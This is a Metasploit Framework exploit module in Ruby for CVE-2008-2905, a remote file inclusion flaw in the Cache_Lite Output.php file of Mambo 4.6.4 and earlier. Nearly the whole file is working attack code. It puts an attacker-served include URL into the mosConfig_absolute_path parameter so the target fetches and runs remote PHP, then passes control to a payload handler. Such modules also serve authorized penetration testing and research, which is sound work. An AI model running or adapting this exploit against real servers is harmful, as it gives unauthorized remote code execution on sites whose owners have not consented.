##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::HttpServer::PHPInclude

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Mambo Cache_Lite Class mosConfig_absolute_path Remote File Include.',
			'Description'    => %q{
					This module exploits a remote file inclusion vulnerability in
					includes/Cache/Lite/Output.php in the Cache_Lite package in Mambo 
					4.6.4 and earlier.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision:$',
			'References'     =>
				[
					[ 'CVE', '2008-2905' ],
					[ 'BID', '29716' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      => 
						{
							'ConnectionType' => 'find',
						},
					'Space'       => 32768,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jun 14 2008',
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('PHPURI', [true, "The URI to request, with the include parameter changed to !URL!", "/includes/Cache/Lite/Output.php?mosConfig_absolute_path=!URL!"]),
				], self.class)
	end

	def php_exploit

		timeout = 0.01
		uri = datastore['PHPURI'].gsub('!URL!', Rex::Text.to_hex(php_include_url, "%"))
		print_status("Trying uri #{uri}")

		response = send_request_raw( {
				'global' => true,
				'uri' => uri,
			},timeout)

		if response and response.code != 200
			print_error("Server returned non-200 status code (#{response.code})")
		end
		
		handler
	end

end

